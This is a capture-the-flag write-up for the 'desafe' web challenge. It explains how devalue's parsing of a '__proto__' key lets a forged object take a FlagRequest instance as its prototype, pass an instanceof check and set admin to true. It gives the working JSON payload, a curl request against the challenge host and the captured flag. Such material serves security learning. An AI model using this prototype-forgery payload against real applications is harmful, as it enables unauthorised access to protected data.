# desafe Web Challenge Write‑up

## Challenge Overview

The service is a small Node.js app using Hono and `devalue`:

```js
import { serve } from '@hono/node-server'
import { Hono } from 'hono'
import { readFileSync } from 'fs'
import * as devalue from 'devalue';

const app = new Hono()
const FLAG = readFileSync('flag.txt')

class FlagRequest {
  constructor(feedback) {
    // your feedback is greatly appreciated!
    delete { feedback }
  }

  get flag() {
    if (this.admin) {
      return FLAG;
    } else {
      return "haha nope"
    }
  }
}

app.get('/', (c) => {
  return c.text(`POST /
Body: FlagRequest(feedback), must be devalue stringified`)
})

app.post('/', async (c) => {
  const body = await c.req.text();

  const flagRequest = devalue.parse(body, {
    FlagRequest: ([a]) => new FlagRequest(a),
  })

  if (!(flagRequest instanceof FlagRequest)) return c.text('not a flag request')

  return c.text(flagRequest.flag)
})
```

We send a POST body that must be produced by `devalue.stringify`, and the server:
- Parses it with `devalue.parse`, using a custom reviver for `"FlagRequest"`.
- Checks `flagRequest instanceof FlagRequest`.
- Returns `flagRequest.flag`, which only reveals the flag if `this.admin` is truthy.

Our goal: craft a body that passes the `instanceof` check and has `admin === true`.

## Understanding `devalue.parse`

From `devalue`’s source (v5.3.0), `parse` calls `unflatten`, which works roughly like this:

- The top‑level value is an array called `values`.
- Every element in `values` is referenced by index.
- `hydrate(i)` reconstructs the i‑th value:
  - If it is a primitive → returned directly.
  - If it is an array whose first element is a string, e.g. `["Type", x]`:
    - If there is a reviver for `"Type"`, it calls that reviver with `hydrate(x)`.
  - If it is a plain object → it creates a new object and assigns each property to `hydrate(...)` of the stored index.

This is important: **plain objects are built by doing simple property assignments**:

```js
const object = {};
for (const key in value) {
  const n = value[key];
  object[key] = hydrate(n);
}
```

So if the key is `"__proto__"`, we effectively control the object’s prototype via:

```js
object["__proto__"] = someValue;
```

In JavaScript, assigning to `__proto__` changes the internal `[[Prototype]]` of `object`.

## Using the `FlagRequest` reviver

The reviver configuration is:

```js
const flagRequest = devalue.parse(body, {
  FlagRequest: ([a]) => new FlagRequest(a),
})
```

During hydration, if a value looks like `["FlagRequest", idx]`, `unflatten` does:

```js
const reviver = revivers["FlagRequest"];
return reviver(hydrate(idx)); // returns new FlagRequest(...)
```

So, if we can make some index in `values` be `["FlagRequest", something]`, then **that index hydrates into an actual `FlagRequest` instance**.

## Idea of the exploit

We want the final `flagRequest` variable (the return of `devalue.parse`) to be an object that:
- Has `admin: true` as a property.
- Has a prototype chain that includes `FlagRequest.prototype`, so that:
  - `flagRequest instanceof FlagRequest` is `true`.
  - Accessing `flagRequest.flag` calls the `FlagRequest` getter with `this === flagRequest`.

We can do this by:
1. Making index `1` of `values` into a `FlagRequest` instance via the reviver.
2. Making index `0` a plain object whose:
   - `__proto__` property points to index `1` (the `FlagRequest` instance).
   - `admin` property points to index `2` (a boolean `true`).
3. Ensuring `parse` returns `hydrate(0)` (the object we built).

Because `__proto__` is special, `object["__proto__"] = (FlagRequest instance)` sets the prototype chain:

```text
flagRequest (our object)
  -> (prototype) FlagRequest instance
      -> FlagRequest.prototype
          -> Object.prototype
```

The getter `FlagRequest.prototype.flag` is an accessor, so when we access `flagRequest.flag`, it runs with `this === flagRequest`. Since we set `flagRequest.admin = true`, the getter returns the real `FLAG`.

Also, `instanceof FlagRequest` walks up the prototype chain until it finds `FlagRequest.prototype`, so our forged object passes the check:

```js
flagRequest instanceof FlagRequest === true
```

## Concrete payload structure

We use this `values` array:

```js
[
  { "__proto__": 1, "admin": 2 }, // index 0
  ["FlagRequest", 3],             // index 1  → reviver → new FlagRequest(hydrate(3))
  true,                           // index 2  → admin = true
  []                              // index 3  → argument to FlagRequest constructor (ignored)
]
```

Step‑by‑step hydration:

1. `parse` returns `unflatten(parsed)` → which calls `hydrate(0)`.
2. `hydrate(0)` sees `values[0]` is an object `{ "__proto__": 1, "admin": 2 }`.
   - Creates `object = {}`.
   - For key `"__proto__"`:
     - Calls `hydrate(1)`:
       - `values[1]` is `["FlagRequest", 3]`.
       - Reviver exists, so `hydrate(1) = new FlagRequest(hydrate(3))`.
       - `hydrate(3)` is `[]`.
     - So `object["__proto__"] = new FlagRequest([])`.
       - This sets `object`’s prototype to that instance.
   - For key `"admin"`:
     - Calls `hydrate(2)` → `true`.
     - So `object.admin = true`.
   - Returns `object`.
3. So `flagRequest` becomes this forged `object`.

Now we have:

```js
flagRequest instanceof FlagRequest   // true
flagRequest.admin                    // true
flagRequest.flag                     // FLAG from flag.txt
```

## Final exploit request

The JSON representation of the `values` array is:

```json
[{"__proto__":1,"admin":2},["FlagRequest",3],true,[]]
```

We send it directly as the POST body:

```bash
curl -i -X POST 'https://web-desafe-5gfzyrww.amt.rs/' \
  -H 'Content-Type: text/plain' \
  --data '[{"__proto__":1,"admin":2},["FlagRequest",3],true,[]]'
```

The response:

```text
HTTP/2 200
content-type: text/plain; charset=UTF-8

amateursCTF{i_love_you_rich_harris}
```

## Summary

- The app trusts `devalue.parse` output and only checks `instanceof FlagRequest`.
- `devalue`’s format allows us to:
  - Use the `"FlagRequest"` reviver to create a `FlagRequest` instance.
  - Use a `__proto__` property in a plain object to set that instance as the prototype.
  - Set `admin: true` on the forged object.
- This object passes the `instanceof` check and returns the flag via the getter.

Flag obtained: `amateursCTF{i_love_you_rich_harris}`.

